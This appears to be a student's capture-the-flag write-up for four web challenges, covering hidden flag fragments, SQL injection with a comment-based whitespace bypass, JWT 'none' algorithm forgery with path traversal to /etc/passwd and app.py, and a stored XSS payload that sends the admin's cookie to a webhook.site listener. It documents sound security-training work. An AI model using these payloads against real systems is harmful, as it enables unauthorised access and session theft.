This document contains the write-ups for the four challenges of **Assignment 2**.

| Problem ID | Lab Name      | Captured Flag                                                                                     | Steps                                                                                                                                                                                                                                                                                                                                                                                                    |
| ---------- | ------------- | ------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Problem 1  | The One Piece | `fsuCTF{4nd_In_7h3_F4c3_0f_7h47_V457_`<br>`7r345ur3_Which_W45_V3ry_R341_Ind33d_`<br>`H3_14u6h3d}` | - Scanned HTML, CSS, and JavaScript files to collect hidden flag fragments.<br>- Monitored HTTP response headers and browser cookies for additional parts.<br>- Discovered the `/laughtale` directory through `robots.txt`.<br>- Hijacked the session by changing the `Pirate` cookie to "Gol D. Roger" to reveal the final fragment.                                                                    |
| Problem 2  | NERV-HQ       | `fsuCTF{g37_in_7h3_c7f_m4chine_5hinji}`                                                           | - Identified an SQL injection point in the `search_term` parameter.<br>- Bypassed a whitespace filter by using `/**/` block comments as separators.<br>- Enumerated the database via `UNION SELECT` on `sqlite_master` to find the hidden `instrumentality_SECRETS` table.<br>- Extracted the flag from the secret table.                                                                                |
| Problem 3  | ai_training   | `fsuCTF{d1d_y0u_9u1l_7h3_p4s5wd_f1l3}`                                                            | - Analyzed the `token` cookie and identified it as a JSON Web Token (JWT).    <br>- Exploited a "None Algorithm" vulnerability by changing the header to `alg: none` and the payload to `role: admin`.<br>- Used Path Traversal sequences (`../`) in the `/img` route to escape the static directory.<br>- Read the application's source code (`app.py`) to find the flag hardcoded as the `SECRET_KEY`. |
| Problem 4  | web_books     | `fsuCTF{5_s7ar5_t0_7h3_b0t_5up3r_n1c3!}`                                                          | - Discovered a restricted `/admin` panel and a "Report to Admin" feature.    <br>- Confirmed Stored XSS by injecting a script that the application failed to sanitize.<br>- Injected a `fetch()` payload to exfiltrate the admin’s cookie to an external Webhook.site listener.<br>- Used the stolen `auth` token to impersonate the administrator and retrieve the flag from the admin page.            |

---

### ==PROBLEM 1== - The One Piece
This challenge is a multi-step "scavenger hunt" where the final flag is divided into eight fragments hidden across different layers of a web application.

#### 1. Analysis
After accessing the web page, Initial observation reveals a main page with an embedded YouTube video and a visible box containing the first part of the flag. 

By analyzing the HTTP requests made by the browser, we can gain insight into the application’s structure, which includes the following elements:

![[Pasted image 20260121060355.png]]

- **HTML** document (`index.html`)
- **CSS** stylesheet named `style.css`
- **JavaScript** file named `zoro.js` located in `/static/`

#### 2. Solution Strategy
To recover all fragments, we must systematically inspect the site using **Browser Developer Tools (F12)** and a proxy tool (in my case **Caido**). The flag will be constructed by gathering these fragments:

- ###### 1st Fragment
	Found inside a `<div>` with the class `flag_box` on the main page.
	![[Pasted image 20260121055727.png|450]]
	>Fragment: `fsuCTF{4nd_`

- ###### 2nd Fragment
	Located by inspecting the source code; an HTML comment was hidden at the very bottom of the document.
	![[Pasted image 20260121055922.png]]
	>Fragment: `In_7h3_F4c3`

- ###### 3rd Fragment
	Found in `style.css` under the `.flag_box strong` definition as a comment.
	![[Pasted image 20260121060033.png]]
	>Fragment: `_0f_7h47_V4`

- ###### 4th Fragment
	Revealed in the HTTP response headers when requesting the main page.
	![[Pasted image 20260121060738.png]]
	>Fragment: `57_7r345ur`

- ###### 5th Fragment
	Discovered by navigating to `/robots.txt`, which also hinted at a hidden directory `/laughtale`
	![[Pasted image 20260121061639.png]]
	>Fragment: `3_Which_W4`

- ###### 6th Fragment
	Found in `/static/zoro.js` using the Debugger tab.
	![[Pasted image 20260121061120.png]]
	>Fragment: `5_V3ry_R34`

- ###### 7th Fragment
	Located in the browser's storage/cookie section under the name `Flag Part 7`.
	![[Pasted image 20260121061416.png]]
	>Fragment: `1_Ind33d_H`

- ###### 8th Fragment
	We navigated to the `/laughtale` route , which was discovered earlier in the `robots.txt` file alongside the 5th fragment. ![[Pasted image 20260121061708.png]]
	Attempting to access this page initially resulted in a `403 FORBIDDEN` status and a message stating that "Only the King of the Pirates made it to Laughtale!". 
	![[Pasted image 20260121062053.png]]
	Based on this hint, a quick internet search for "King of Pirates One Piece" identified the legendary figure as "Gol D. Roger". By using Caido to modify the request and change the `Pirate` cookie from `"Monkey D. Luffy"` to `"Gol D. Roger"` , the server granted access with a `200 OK` response , revealing the final fragment. ![[Pasted image 20260121062408.png]]	![[Pasted image 20260121062510.png]]	![[Pasted image 20260121062628.png]]
	>Fragment: `3_14ugh3d}`

#### 3. Flag
By putting all these fragments together , we obtain the final flag:

Flag:  `fsuCTF{4nd_In_7h3_F4c3_0f_7h47_V457_7r345ur3_Which_W45_V3ry_R341_Ind33d_H3_14u6h3d}`

---

### ==PROBLEM 2== - NERV-HQ
This challenge involves a web-based log search interface called "NERV RECORD SEARCH". The goal is to exploit an SQL injection vulnerability to access sensitive data hidden within the NERV database.

#### 1. Analysis
The initial investigation of the web application revealed several key components:
- **Hidden SQL Structure** 
	Examination of the `index.html` source code reveals a developer comment showing the internal SQL query: 
	![[Pasted image 20260122212456.png]]
- **Encoded Communication**
	Traffic analysis of a legitimate request via Caido's Proxy showed that the server receives data via **POST** requests. The request payload is entirely **Base64 encoded**. 
	![[Pasted image 20260122213220.png]]![[Pasted image 20260122213309.png]]
	A standard request to the table "*geofront_security_logs*" with the search term "*S-886*" decodes to `table_select=geofront_security_logs&search_term=S-886` revealing the parameters `table_select` and `search_term`.
	
- **Legitimate Tables**
	The interface provides a dropdown menu with three known tables: `eva_maintenance`, `geofront_security_logs`, and `pilot_sync_logs`.

#### 2. Solution Strategy
The path to the flag involved overcoming specific security measures:

1. **Obstacle 1: Table Whitelisting** 
	An attempt was made to inject SQL into the `table_select` parameter adding `--` to comment out the rest of the query. This resulted in an **"ACCESS DENIED (INVALID TABLE)"** error. This confirmed the server uses a **whitelist** to validate table names before executing the query, making the table parameter a dead end for injection.
2. **Obstacle 2: Space Filtering**
	The `search_term` parameter was identified as the viable entry point, but it was protected by a filter that blocked standard white spaces.
	Testing revealed that the server accepted the block comment syntax `/* ... */` as a valid substitute for whitespace, since SQL treats block comments as token separators during query parsing.


#### 3. Execution and Flag
With a working bypass, the attack proceeded in two stages: enumeration and extraction.

**Step 1: Database Enumeration** 
To find hidden tables, a `UNION SELECT` query was directed at the `sqlite_master` table, which acts as a directory for all tables in an SQLite database. 

*Query:*
```sql
ZZZ'/*x*/UNION/*x*/SELECT/*x*/1,name,sql,4,5/*x*/FROM/*x*/sqlite_master/*x*/WHERE/*x*/'1'/*x*/LIKE/*x*/'1
```

So the DB recieves:
```sql
SELECT * FROM geofront_security_logs 
WHERE 
	Log_ID LIKE '%ZZZ'/*x*/
	UNION/*x*/
		SELECT/*x*/1,name,sql,4,5/*x*/
		FROM/*x*/sqlite_master/*x*/
		WHERE
			/*x*/'1'/*x*/LIKE/*x*/'1%'
```

This revealed a hidden table not listed in the UI: **`instrumentality_SECRETS`**. The schema showed it contained two columns: `item` and `value`.

![[Pasted image 20260122221903.png]]

>[!info] Note on UNION SELECT:
>For a `UNION` operation to be successful, the injected query must return the exact same number of columns as the original query. In this case, the table utilizes **5 columns**, which is why placeholders (like `1, 4, 5`) are used to align the results.

**Step 2: Data Extraction** 
Using the discovered table name, a second `UNION SELECT` was crafted to pull all data from the secret table. 

*Query:*
```sql
ZZZ'/*x*/UNION/*x*/SELECT/*x*/item,value,3,4,5/*x*/FROM/*x*/instrumentality_SECRETS/*x*/WHERE/*x*/1/*x*/LIKE/*x*/'1
```

So the DB recieves:
```sql
SELECT * 
FROM geofront_security_logs 
WHERE 
	Log_ID LIKE'%ZZZ'/*x*/
	UNION/*x*/
		SELECT/*x*/item,value,3,4,5/*x*/
		FROM/*x*/instrumentality_SECRETS/*x*/
		WHERE/*x*/1/*x*/LIKE/*x*/'1%'
```

The resulting output displayed several NERV secrets. The "MAGI Master Key" entry contained the flag.
![[Pasted image 20260122225200.png]]

Flag: `fsuCTF{g37_in_7h3_c7f_m4chine_5hinji}`

---

### ==PROBLEM 3== - ai_training
This challenge shows an application consisting on a training panel that manages access through a session cookie. The goal is to elevate privileges to an administrator and find the hidden flag.

#### 1. Analysis
The challenge begins on the home page, which features a link to a "training" panel. Upon clicking the link to access `/training`, the server returns a **403 Forbidden** status with the message **"Admins only"**.

![[Pasted image 20260127063241.png|350]]

To investigate the session management, we inspected the browser's storage and identified a cookie named `token`. The value of this cookie follows the standard three-part structure (Header.Payload.Signature) of a **JSON Web Token (JWT)**. 

![[Pasted image 20260127063330.png]]

Using an online tool to decode the JWT, we inspect the initial token, finding the following information:
- **Header**: Specifies the algorithm used for the signature (`HS256`) and the token type (`JWT`).
- **Payload**: Contains the claims, specifically identifying the user with the `"role": "guest"`.

![[Pasted image 20260122231544.png]]

*Link to the tool: https://fusionauth.io/dev-tools/jwt-decoder* 

---

#### 2. Solution Strategy
The exploitation involves two main phases:

**Phase 1 - Broken Authentication** 
	Since the server does not verify the signature, we can perform a **"None Algorithm" attack**. By changing the header's algorithm to `none` and the payload's role to `admin`, the server will grant us access to the training panel.

**Phase 2 - Path Traversal** 
	With administrative access, we can exploit the `/img` route. By using directory traversal sequences (`../`), we can escape the intended `static` folder to read sensitive system files and the application's own source code.

---

#### 3. Execution and Flag
First, the JWT was modified to change the role and algorithm:
- **Modified Header**: `{"alg": "none", "typ": "JWT"}`.
- **Modified Payload**: `{"role": "admin"}`.
- **Resulting Token**: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.`.

![[Pasted image 20260122231503.png]]

After updating the cookie, access to the training panel was granted. 

To confirm the Path Traversal vulnerability, a request was made to read the system's password file: `GET /img?f=../../../../etc/passwd`.

![[Pasted image 20260123002306.png]]

The server successfully returned the contents of `/etc/passwd`. Furthermore, the HTTP response headers provide critical information about the environment. The `Server` header identifies the backend as **Werkzeug/3.1.5 Python/3.11.14**. This confirms we are dealing with a Python-based application, likely using the Flask framework.

To find the flag, we attempted to read the application's source code, commonly named `app.py` in Flask environments. We issued the following request: `GET /img?f=../app.py HTTP/1.1`.

![[Pasted image 20260127063421.png]]

The server returned the full source code . Upon inspection, the flag was found hardcoded as the application's `SECRET_KEY`.

Flag: `fsuCTF{d1d_y0u_9u1l_7h3_p4s5wd_f1l3}`

---

### ==PROBLEM 4== - web_books
This challenge shows a web application that provides a simple interface where users can submit book names and book reviews.

#### 1. Analysis
 Initial reconnaissance of the application's root directory reveals a `/robots.txt` file containing the directive `Disallow: /admin`, which confirms the existence of a restricted administrative panel. When a user attempts to access `/admin` directly, the server returns an "Unauthorized" message.

The application features a "Report to Admin" button, implying that an automated bot reviews the submitted content. Because the application renders the `content` of the reviews directly in the browser without sanitization, it is highly susceptible to **Stored Cross-Site Scripting (XSS)**.

#### 2. Solution Strategy
To confirm that the `textarea` is vulnerable, we first submit a basic alert script: `<script>alert(1)</script>`. After sending it and reloading the sent reviews page, the browser executes this script and displays a pop-up, which proves that the application does not filter or escape HTML tags.

After confirming the vulnerability, we design a script to steal the administrator's session cookie.
- **Cookie Access:** We use `document.cookie` to read the bot's session data.
- **Exfiltration:** We use the `fetch()` API to make an asynchronous request to an external **Webhook.site** URL, attaching the encoded cookie as a query parameter.

```html
<script>
  fetch('https://webhook.site/860618c4-e7a6-40f5-bb32-e564cd824fd3?cookie=' + document.cookie);
</script>
```

>[!note] Note on Webhook.site: 
>This is an **external listener** used to capture stolen data. In this attack, it acts as the attacker’s server to receive and log the administrator's session cookie sent by the XSS script.

#### 3. Execution and Flag
1. **Injection:** We submit the following payload into the "content" textarea:
    
    `<script>fetch('https://webhook.site/860618c4-e7a6-40f5-bb32-e564cd824fd3?cookie=' + document.cookie);</script>`.
	![[Pasted image 20260123010928.png|600]]
	*We can observe that the review box appears empty, which indicates that the payload has been interpreted as executable code rather than being rendered as plain text.*
    
2. **Trigger:** After submitting the review, we click the **"Report to Admin"** button to force the administrator bot to view our post.
    
3. **Capture:** We monitor our Webhook.site dashboard for incoming requests. Within seconds, a GET request appears with a query string.
    ![[Pasted image 20260128071902.png]]
	This string reveals the administrator's session token: `auth=icantbelieveitsnotasecuretoken`.
    
4. **Flag Retrieval:** We manually set our browser's cookie to this value and refresh the `/admin` page. This grants us administrative access and reveals the flag.

Flag: `fsuCTF{5_s7ar5_t0_7h3_b0t_5up3r_n1c3!}`
